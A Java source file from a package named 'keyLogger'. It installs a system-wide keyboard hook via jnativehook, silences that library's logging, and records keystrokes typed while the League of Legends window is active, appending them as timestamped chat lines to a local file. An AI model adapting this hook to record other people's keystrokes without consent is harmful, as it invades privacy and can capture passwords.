package keyLogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;

public class LoLGameLogger implements NativeKeyListener {
    private static LoLGameLogger ourInstance = new LoLGameLogger();
    private boolean currentlyRunning;
    private String message = "From: LoL-Game || At: " + getCurrentTime() + "|| Message: ";
    private String sendKey = "Enter";
    private boolean logging;
    private String fileName;
    private AccessWindow accessWindow = new AccessWindow();


    public static LoLGameLogger getInstance() {
        return ourInstance;
    }

    private LoLGameLogger() {
    }

    private String getCurrentTime() {
        return new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new Date());
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        if (accessWindow.getActiveWindowTitle().equals(Globals.lolGame)) {
            if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals(sendKey)) {
                if (!logging) {
                    logging = true;
                } else {
                    try {
                        saveMessage();
                    } catch (IOException e1) {
                        e1.printStackTrace();
                    }
                    logging = false;
                }
            }
            if(!NativeKeyEvent.getKeyText(e.getKeyCode()).equals(sendKey)) {
                if (accessWindow.getActiveWindowTitle().equals(Globals.lolGame)) {
                    if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")) {
                        message = message + " ";
                    } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).length() < 2) {
                        message = message + NativeKeyEvent.getKeyText(e.getKeyCode());
                    }
                }
            }
        }
    }

    public void setFileName(String fileName) {
        this.fileName = fileName;
    }

    public void setDefaults() {
        message = "From: LoL-Game || At: " + getCurrentTime() + "|| Message: ";
    }


    public boolean isCurrentlyRunning() {
        return currentlyRunning;
    }

    private void saveMessage() throws IOException {
        BufferedWriter writer = new BufferedWriter(new FileWriter(fileName, true));
        writer.write(message);
        writer.newLine();
        writer.flush();
        writer.close();
        setDefaults();
        System.out.println(message);
        System.out.println("Message saved sucsessfully");
    }


    public void turnOn() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
        GlobalScreen.addNativeKeyListener(LoLGameLogger.getInstance());
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        currentlyRunning = true;

    }
    public void turnOff() throws NativeHookException, IOException {
        GlobalScreen.unregisterNativeHook();
        saveMessage();
        setDefaults();
        currentlyRunning = false;
    }

    public void nativeKeyReleased(NativeKeyEvent e) { }
    public void nativeKeyTyped(NativeKeyEvent e) { }
}


